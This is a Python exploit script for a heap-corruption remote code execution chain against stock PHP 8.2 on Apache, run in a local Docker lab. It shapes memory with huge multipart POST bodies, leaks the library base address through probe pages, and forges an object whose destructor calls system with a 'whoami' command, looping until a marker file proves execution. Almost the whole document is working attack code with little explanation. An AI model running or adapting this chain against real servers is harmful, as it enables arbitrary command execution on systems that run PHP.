#!/usr/bin/env python3
"""oom123: RECYCLED-PAGE ARM — phase A (slot determinism) + armed chain.

Mechanism (core.122 + disasm, tonight): crash post's arData is served
from RECYCLED heap (glibc dynamic mmap threshold) containing stale
warm-post bytes (K evidence, walk steps rbx+=0x20, type byte @+9,
zeros skipped, rc_dtor_func @+544 on rc->0). Carrier = ~3KB VALUES
(heap-resident, page-emptying): warm posts tile B||B cells; crash
post (same shape) gets its arData over those pages; walk reads
B||B -> ti=B.lo4 (legal) -> rc->0 -> rc_dtor_func -> store_del ->
free_obj(B)=system; B = crash post's own part13 3KB value @OFF
(block live at walk time).

Phase A: two identical marker posts (values 3072B SKIP16 tiles,
part13 w/ 32B marker @128) -> half-needle probes (16B probe needle
lives in a different size class than the freed 3KB chunk -> no
self-copy poison) -> V1 vs V2 determinism.
Phase B (if deterministic): legality-slide OFF -> ALL-armed posts
(values cell_of(B) tiles, block in part13) x3 fires -> segv/rdi/core/
tmp/x. If not deterministic: report V1/V2 delta for redesign.
"""
import re, struct, subprocess, time, urllib.request, urllib.error
import payload68 as P

HOST = "http://127.0.0.1:8081"
STOCK_MD5 = "ce1f3c48ba22f8f17834ac791aead613"
ZIF = 0x39B8A0
CMD = b"whoami>/tmp/x"
SKIP16 = b"\x02" * 16
NV = 192                     # 3072B values
V3K = SKIP16 * NV
PART = 13
K1 = 4200
MOFF = 128                   # marker/block offset inside part13 value
M32 = b"RECYCPAGEARM1234" + b"QMARK7XY" * 2
assert len(M32) == 32


def get(url, timeout=90):
    try:
        return 200, urllib.request.urlopen(url, timeout=timeout).read(200000).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200000).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__


def sh(cmd, timeout=60):
    r = subprocess.run(["docker", "exec", "php_vuln", "sh", "-c", cmd],
                       capture_output=True, timeout=timeout)
    return (r.stdout + r.stderr).decode("latin1").strip()


def segv_count():
    r = subprocess.run(["docker", "logs", "php_vuln"], capture_output=True, timeout=120)
    return len(re.findall(r"exit signal Segmentation", (r.stdout + r.stderr).decode("latin1", "replace")))


def recreate():
    subprocess.run(["docker", "rm", "-f", "php_vuln"], capture_output=True)
    subprocess.run(["docker", "run", "-d", "--name", "php_vuln", "-p", "8081:80",
                    "-v", "/tmp/phplab:/var/www/html",
                    "-v", "/tmp/phplab/oom1worker.conf:/etc/apache2/conf-enabled/oom1worker.conf",
                    "-v", "/tmp/phplab/30-oomlab.ini:/usr/local/etc/php/conf.d/30-oomlab.ini",
                    "--cap-add", "SYS_PTRACE", "--ulimit", "core=-1",
                    "php:8.2.34-apache"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        c, _o = get(HOST + "/oom_sapi.php", timeout=8)
        if c == 200:
            return True
    return False


def post_mod(body, timeout=240):
    req = urllib.request.Request(HOST + "/oom_mod.php", data=body,
                                 headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        return 200, urllib.request.urlopen(req, timeout=timeout).read(300).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(300).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR %s" % type(e).__name__


def probe_hits(half):
    code, out = get("%s/oom_probe.php?h=%s&chunk=262144&maxc=8" % (HOST, half.hex()))
    hits = []
    for line in out.splitlines():
        line = line.strip()
        if not line.startswith("R="):
            continue
        for tok in re.findall(r"([0-9a-f]+)@ctx([0-9a-f]*)", line):
            addr = int(tok[0], 16)
            ctx = bytes.fromhex(tok[1]) if tok[1] else b""
            hits.append((addr, len(ctx) == 16 and ctx == SKIP16))
    return hits


def base_now():
    c, o = get(HOST + "/oom_probe.php?libphp=1")
    m = re.search(r"libphp=0x([0-9a-f]+)", o)
    return int(m.group(1), 16) if m else None


def cell_of(addr):
    return struct.pack("<Q", addr) * 2


def part13_3k(marker=False, B=None, OFF=MOFF):
    t = bytearray(V3K)
    if marker:
        t[OFF:OFF + 32] = M32
    else:
        st = struct.pack_into
        st("<II", t, OFF + 0x00, 1, 0x108)
        st("<II", t, OFF + 0x08, 1, 0)
        st("<Q", t, OFF + 0x10, 0)
        st("<Q", t, OFF + 0x18, B + 0x68)
        st("<I", t, OFF + 0x2C, 1)
        st("<Q", t, OFF + 0x50, B + 0x90)
        t[OFF + 0x58] = 6
        st("<I", t, OFF + 0x5C, 0x106)
        st("<Q", t, OFF + 0x68, 0)
        st("<Q", t, OFF + 0x70, BASE + ZIF)
        st("<IIQI", t, OFF + 0x90, 1, 0x106, 0, len(CMD))
        t[OFF + 0xA8: OFF + 0xA8 + len(CMD) + 1] = CMD + b"\x00"
        for s in range(0, len(t), 16):
            if s + 16 <= len(t) and not (OFF <= s < OFF + 0xB8):
                t[s:s + 16] = cell_of(B)
    return bytes(t)


def build_body(part13_val, other_val):
    ps = []
    for i in range(K1):
        head = (b'--BOUND\r\nContent-Disposition: form-data; name="'
                + SKIP16 * 190 + b"%d" % i + b'[x]"\r\n\r\n')
        val = part13_val if i == PART else other_val
        ps.append(head + val + b"\r\n")
    ps += [P.poison_part(n, 5000000 + n * P.CELLS) for n in range(P.PREP)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def measure_slot():
    """One marker post + half-needle probes -> (addr or None)."""
    c, _r = post_mod(build_body(part13_3k(marker=True), V3K))
    time.sleep(0.5)
    h1 = [a for a, real in probe_hits(M32[0:16]) if real]
    h2 = [a for a, real in probe_hits(M32[16:32]) if real]
    if h1 and h2 and h1[0] == h2[0] - 16:
        return h1[0] - MOFF, c        # slot base
    return (h1[0] - MOFF if h1 else None), c


print("=== oom123: recycled-page arm ===", flush=True)
assert recreate(), "recreate failed"
md5 = sh("md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
assert md5 == STOCK_MD5, "not stock"
print("md5 ok", flush=True)

for k1 in P.K1S[:-1]:
    post_mod(P.build_attack(k1, 5000000))
print("shaped segv=%d" % segv_count(), flush=True)
BASE = base_now()
print("base=0x%x" % BASE, flush=True)

# ---- phase A: determinism ----
V1, c1 = measure_slot()
V2, c2 = measure_slot()
V3, c3 = measure_slot()
print("slots: V1=%s V2=%s V3=%s" % (V1 and hex(V1), V2 and hex(V2), V3 and hex(V3)), flush=True)
det = V1 is not None and V1 == V2 == V3
print("PHASE A: deterministic=%s" % det, flush=True)

if det:
    # ---- phase B: armed chain ----
    B = None
    for delta in range(0, 4096 - 0xB8 - MOFF, 16):
        off = MOFF + delta
        cand = V1 + off
        if cand & 0xF == 8 and (cand >> 8) & 1 == 1 and (cand >> 9) & 1 == 0:
            nb = cand.to_bytes(6, "little")
            if not any(b in (0x00, 0x0A, 0x0D, 0x22, 0x27, 0x5C, 0x3B, 0x3D) for b in nb):
                B, OFF = cand, off
                break
    assert B, "no legal B from V1"
    print("B=0x%x OFF=0x%x nib8=%d bit8=%d bit9=%d"
          % (B, OFF, B & 0xF, (B >> 8) & 1, (B >> 9) & 1), flush=True)
    armed = build_body(part13_3k(B=B, OFF=OFF), cell_of(B) * NV)
    print("armed body %.2f MB" % (len(armed) / 1048576.0), flush=True)
    for rep in range(3):
        n0 = segv_count()
        c, r = post_mod(armed)
        time.sleep(2)
        d = segv_count() - n0
        core = sh("test -f /tmp/core && echo y") == "y"
        xf = sh("cat /tmp/x 2>&1")
        print("fire%d: %s segv+%d core=%s x=%s" % (rep, c, d, core, xf[:40]), flush=True)
        if core:
            host_copy = "/tmp/core123_f%d" % rep
            subprocess.run(["docker", "cp", "php_vuln:/tmp/core", host_copy], capture_output=True)
            subprocess.run(["docker", "cp", host_copy, "phpbuild:/tmp/core.123_f%d" % rep], capture_output=True)
            open("/tmp/g123b.gdb", "w").write("set pagination off\nset confirm off\ninfo registers rdi rbx rip\nquit\n")
            r2 = subprocess.run(["docker", "exec", "phpbuild", "sh", "-c",
                                 "gdb -q -batch -x /tmp/g123b.gdb /tmp/libphp.stock.so /tmp/core.123_f%d 2>&1 | grep -E '^rdi|^rip'" % rep],
                                capture_output=True, timeout=240)
            print(r2.stdout.decode("latin1"), flush=True)
            sh("mv /tmp/core /tmp/core.used 2>/dev/null")
        if "/tmp/x" in xf:
            print("!!! /tmp/x EXISTS - CAMPAIGN WON", flush=True)
            break
else:
    print("slots drift - need page-tile redesign (B||B across whole 3KB won't need slot identity; report)", flush=True)

print("=== done ===", flush=True)
